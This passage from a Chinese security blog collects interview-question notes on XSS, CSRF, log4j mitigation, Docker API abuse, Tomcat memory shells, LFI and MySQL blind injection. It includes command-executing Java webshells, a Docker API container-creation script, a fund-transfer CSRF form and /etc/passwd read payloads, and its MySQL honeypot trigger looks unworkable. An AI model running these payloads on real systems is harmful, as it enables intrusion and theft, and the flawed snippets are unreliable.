</li>
</ol>
<h3 id="排查C2域名"><a href="#排查C2域名" class="headerlink" title="排查C2域名"></a>排查C2域名</h3><ol>
<li><p>**使用<code>dig</code>或<code>nslookup</code>**：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig c2.maliciousdomain.com</span><br><span class="line">nslookup c2.maliciousdomain.com</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查看DNS缓存</strong>：</p>
<ul>
<li><strong>Windows</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /displaydns</span><br></pre></td></tr></table></figure></li>
<li><strong>Linux</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemd-resolve --statistics</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>分析网络流量</strong>：</p>
<ul>
<li>使用<code>tcpdump</code>捕获流量：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -w capture.pcap</span><br></pre></td></tr></table></figure></li>
<li>使用<code>Wireshark</code>分析捕获的流量。</li>
</ul>
</li>
</ol>
<h3 id="XSS修复与利用"><a href="#XSS修复与利用" class="headerlink" title="XSS修复与利用"></a>XSS修复与利用</h3><ul>
<li><p><strong>HTML编码</strong>：并非所有地方都可以用HTML编码修复XSS，特别是动态内容输出到属性值或JavaScript上下文中时。例如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在设置了HttpOnly的情况下利用XSS</strong>：</p>
<ul>
<li><strong>Cookie窃取</strong>：即使设置了HttpOnly，攻击者仍然可以通过XSS读取非HttpOnly的cookie，或者通过其他方式（如CSRF）利用漏洞。</li>
<li><strong>DOM-based XSS</strong>：通过操作DOM来执行恶意代码，例如：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hash</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Python和Selenium模拟XSS攻击</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&quot;http://vulnerable-site.com/page?param=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>)</span><br><span class="line">alert = driver.switch_to.alert</span><br><span class="line"><span class="built_in">print</span>(alert.text)</span><br><span class="line">alert.accept()</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>利用XSS绕过HttpOnly</strong>：</p>
<ul>
<li><strong>CSRF攻击</strong>：即使无法读取cookie，攻击者仍然可以发送请求到目标网站，执行某些操作。</li>
<li><strong>会话固定</strong>：攻击者可以固定用户的会话ID，然后利用XSS进行进一步攻击。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51683653/article/details/127553777">https://blog.csdn.net/m0_51683653/article/details/127553777</a></li>
</ul>
</li>
<li><p><strong>代码示例（CSRF攻击）</strong>：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://vulnerable-site.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker_account&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="log4j除了升级版本外还有什么修复方式"><a href="#log4j除了升级版本外还有什么修复方式" class="headerlink" title="log4j除了升级版本外还有什么修复方式"></a>log4j除了升级版本外还有什么修复方式</h3><p>除了升级log4j版本外，还可以通过以下方式修复log4j漏洞：</p>
<ol>
<li><p><strong>禁用JNDI查找</strong>：在log4j的配置文件中，通过设置<code>log4j2.formatMsgNoLookups=true</code>来禁用JNDI查找功能，从而防止远程代码执行。</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">log4j2.formatMsgNoLookups</span>=<span class="string">true</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>限制网络连接</strong>：通过防火墙规则限制log4j日志库的网络连接，防止其访问外部恶意服务器。</p>
</li>
<li><p><strong>监控和审计</strong>：启用日志监控工具，实时监控log4j的日志输出，及时发现异常行为。</p>
</li>
</ol>
<h3 id="拿到一个webshell怎么判断他是在docker里还是实机里"><a href="#拿到一个webshell怎么判断他是在docker里还是实机里" class="headerlink" title="拿到一个webshell怎么判断他是在docker里还是实机里"></a>拿到一个webshell怎么判断他是在docker里还是实机里</h3><p>可以通过以下方法判断webshell是否运行在Docker容器中：</p>
<ol>
<li><p><strong>检查环境变量</strong>：Docker容器中通常会设置一些特定的环境变量，如<code>container=docker</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printenv</span> | grep -i docker</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>检查进程</strong>：Docker容器中的进程运行在容器的命名空间中，可以通过检查<code>/proc/1/cgroup</code>文件来判断。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br></pre></td></tr></table></figure>

<p>如果输出中包含<code>docker</code>或<code>containerd</code>，则说明运行在Docker容器中。</p>
</li>
<li><p><strong>检查文件系统</strong>：Docker容器的文件系统通常会包含<code>/docker</code>目录或类似标识。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /docker</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Docker-API未授权漏洞介绍"><a href="#Docker-API未授权漏洞介绍" class="headerlink" title="Docker API未授权漏洞介绍"></a>Docker API未授权漏洞介绍</h3><p>Docker API未授权访问漏洞是指Docker守护进程暴露了API端点，且未进行身份验证，攻击者可以利用该漏洞执行任意命令。</p>
<ol>
<li><p><strong>漏洞描述</strong>：攻击者可以通过发送HTTP请求到Docker API端点，执行容器操作，如创建、删除、执行命令等。</p>
</li>
<li><p><strong>漏洞利用</strong>：以下是一个利用Docker API未授权访问漏洞执行命令的示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://&lt;docker_api_ip&gt;:2375/containers/create&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;Image&quot;</span>: <span class="string">&quot;alpine&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cmd&quot;</span>: [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/pwned&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=payload)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>修复建议</strong>：</p>
<ul>
<li>禁用Docker API的未授权访问。</li>
<li>使用TLS加密通信。</li>
<li>配置防火墙规则，限制对Docker API的访问。</li>
</ul>
</li>
</ol>
<h3 id="机器重启后内存马还在吗"><a href="#机器重启后内存马还在吗" class="headerlink" title="机器重启后内存马还在吗"></a>机器重启后内存马还在吗</h3><p>内存马（Memory Malware）是驻留在内存中的恶意代码，通常不会在机器重启后继续存在。因为内存马依赖于进程的内存空间，而重启会清除内存中的数据。不过，某些高级的内存马可能会通过持久化机制（如定时任务、启动项等）在重启后重新加载。</p>
<h3 id="Tomcat内存马分类"><a href="#Tomcat内存马分类" class="headerlink" title="Tomcat内存马分类"></a>Tomcat内存马分类</h3><p>Tomcat内存马通常通过以下方式实现：</p>
<ol>
<li><p><strong>JSP内存马</strong>：通过动态生成JSP代码并加载到Tomcat的内存中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSPMemoryHorse</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            response.getWriter().println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Filter内存马</strong>：通过注册自定义Filter拦截请求并执行命令。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterMemoryHorse</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            p.waitFor();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                ((HttpServletResponse) response).getWriter().println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Servlet内存马</strong>：通过动态注册Servlet来执行命令。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletMemoryHorse</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            response.getWriter().println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="度小满"><a href="#度小满" class="headerlink" title="度小满"></a>度小满</h2><h3 id="加密的源码处理"><a href="#加密的源码处理" class="headerlink" title="加密的源码处理"></a>加密的源码处理</h3><p>加密的源码处理通常涉及以下几个步骤：</p>
<ol>
<li><strong>加密算法选择</strong>：选择合适的加密算法，如AES、RSA等。</li>
<li><strong>密钥管理</strong>：确保密钥的安全存储和传输。</li>
<li><strong>加密实现</strong>：使用加密库对源码进行加密。</li>
<li><strong>解密实现</strong>：在运行时解密源码。</li>
</ol>
<p>以下是一个使用Python的AES加密示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_source_code</span>(<span class="params">source_code, key</span>):</span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    padded_code = source_code + (AES.block_size - <span class="built_in">len</span>(source_code) % AES.block_size) * <span class="built_in">chr</span>(AES.block_size - <span class="built_in">len</span>(source_code) % AES.block_size)</span><br><span class="line">    encrypted_code = cipher.encrypt(padded_code)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(iv + encrypted_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_source_code</span>(<span class="params">encrypted_code, key</span>):</span><br><span class="line">    encrypted_code = base64.b64decode(encrypted_code)</span><br><span class="line">    iv = encrypted_code[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decrypted_code = cipher.decrypt(encrypted_code[<span class="number">16</span>:])</span><br><span class="line">    <span class="keyword">return</span> decrypted_code[:-<span class="built_in">ord</span>(decrypted_code[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例使用</span></span><br><span class="line">source_code = <span class="string">&quot;print(&#x27;Hello, World!&#x27;)&quot;</span></span><br><span class="line">key = os.urandom(<span class="number">32</span>)</span><br><span class="line">encrypted = encrypt_source_code(source_code.encode(), key)</span><br><span class="line">decrypted = decrypt_source_code(encrypted, key)</span><br><span class="line"><span class="built_in">exec</span>(decrypted)</span><br></pre></td></tr></table></figure>

<h3 id="PHP的危险函数"><a href="#PHP的危险函数" class="headerlink" title="PHP的危险函数"></a>PHP的危险函数</h3><p>PHP中的一些危险函数包括：</p>
<ul>
<li><code>eval()</code>：执行字符串作为PHP代码。</li>
<li><code>system()</code>：执行系统命令。</li>
<li><code>exec()</code>：执行外部程序。</li>
<li><code>passthru()</code>：执行外部程序并将原始输出返回。</li>
<li><code>shell_exec()</code>：执行外部程序并返回完整输出。</li>
<li><code>popen()</code>：打开程序的管道。</li>
<li><code>proc_open()</code>：执行命令并打开文件指针。</li>
</ul>
<p>以下是一个<code>eval()</code>的危险示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user_input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$user_input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="本地文件包含（LFI）"><a href="#本地文件包含（LFI）" class="headerlink" title="本地文件包含（LFI）"></a>本地文件包含（LFI）</h3><p>LFI（Local File Inclusion）漏洞允许攻击者通过包含本地文件来读取或执行服务器上的文件。以下是一个LFI的利用示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>攻击者可以通过以下方式利用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/vulnerable.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<h3 id="MySQL除了SLEEP的函数"><a href="#MySQL除了SLEEP的函数" class="headerlink" title="MySQL除了SLEEP的函数"></a>MySQL除了<code>SLEEP</code>的函数</h3><p>除了<code>SLEEP</code>，MySQL中还有其他可以用于时间盲注的函数：</p>
<ul>
<li><code>BENCHMARK(count, expression)</code>：执行表达式多次。</li>
<li><code>UUID()</code>：生成唯一标识符。</li>
<li><code>RAND()</code>：生成随机数。</li>
</ul>
<p>以下是一个使用<code>BENCHMARK</code>的示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, BENCHMARK(<span class="number">1000000</span>, MD5(<span class="number">1</span>)), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h3 id="MySQL读文件的溯源（MySQL蜜罐）"><a href="#MySQL读文件的溯源（MySQL蜜罐）" class="headerlink" title="MySQL读文件的溯源（MySQL蜜罐）"></a>MySQL读文件的溯源（MySQL蜜罐）</h3><p>MySQL可以通过<code>LOAD_FILE</code>函数读取文件，以下是一个示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>为了溯源，可以设置一个MySQL蜜罐，记录所有对敏感文件的访问：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> access_log (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    query TEXT,</span><br><span class="line">    ip <span class="type">VARCHAR</span>(<span class="number">45</span>),</span><br><span class="line">    <span class="type">timestamp</span> <span class="type">TIMESTAMP</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> before_query</span><br><span class="line">BEFORE <span class="keyword">INSERT</span> <span class="keyword">ON</span> mysql.general_log</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    IF NEW.argument <span class="keyword">LIKE</span> <span class="string">&#x27;%LOAD_FILE%&#x27;</span> <span class="keyword">THEN</span></span><br><span class="line">        <span class="keyword">INSERT</span> <span class="keyword">INTO</span> access_log (query, ip)</span><br><span class="line">        <span class="keyword">VALUES</span> (NEW.argument, CONNECTION_ID());</span><br><span class="line">    <span class="keyword">END</span> IF;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>


<p>0x5A 奇安信-观星实验室</p>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/idea/">Idea</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x19-%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98"><span class="toc-number">1.</span> <span class="toc-text">0x19 字节跳动实习面试复盘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SQL-%E6%B3%A8%E5%85%A5%EF%BC%9A%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%E3%80%81%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">1. SQL 注入：空格绕过、引号绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.2.</span> <span class="toc-text">引号绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-XSS-%E4%B8%AD-SVG-%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.2.</span> <span class="toc-text">2. XSS 中 SVG 的利用和修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SVG-%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">SVG 的利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-DNS-%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%91%E5%AE%9A"><span class="toc-number">1.3.</span> <span class="toc-text">3. DNS 重定向绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E4%BC%98%E5%8A%BF%E5%8F%8A%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.4.</span> <span class="toc-text">数组和链表的优势及原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2%E8%A7%A3%E9%87%8A%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E5%8C%BA%E5%88%AB"><span class="toc-number">1.5.</span> <span class="toc-text">操作系统层面解释进程和线程区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B%E5%92%8C%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.6.</span> <span class="toc-text">线程和进程通信方式以及数据安全问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E9%80%89%E7%94%A8%E5%9C%BA%E6%99%AF%E4%BB%A5%E5%8F%8A%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.7.</span> <span class="toc-text">多进程和多线程的选用场景以及原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">1.8.</span> <span class="toc-text">SQL注入绕过WAF的方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FUZZ%E7%BB%95WAF%E7%9A%84Payload%E9%95%BF%E5%BA%A6"><span class="toc-number">1.9.</span> <span class="toc-text">FUZZ绕WAF的Payload长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 